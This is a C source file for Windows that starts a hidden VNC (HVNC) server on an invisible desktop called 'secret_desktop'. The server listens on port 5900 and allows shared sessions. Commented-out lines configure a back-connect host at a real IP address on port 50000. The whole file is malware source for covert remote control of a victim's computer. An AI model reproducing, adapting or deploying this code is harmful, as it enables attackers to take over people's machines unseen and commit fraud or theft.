#include <windows.h>
#include <hvnc.h>

#pragma comment(linker, "/ENTRY:main" )

int main()
{
	int ret = 1;
	if (VNCInit(true))
    {
		HVNC_INITIALIZE vnc_init={0};
        lstrcpyA(vnc_init.szDeskName,"secret_desktop");
        HVNC hSecretDesktop = VNCCreateServer(&vnc_init);

        HVNC_CONNECTION_INFO conn={0};
        //lstrcpyA(conn.szBCHost,"188.72.202.163");
        //conn.wBCPort=50000;
        conn.wVNCPort = 5900;
        conn.bShared = true;
        VNCStartServer(hSecretDesktop,&conn);

		while( VNCGetServerStatus(hSecretDesktop) == HVNC_SERVER_STARTED )
		{
			Sleep(1);
		}
		ret = 0;
	}
	Sleep(30000);
	return ret;
}
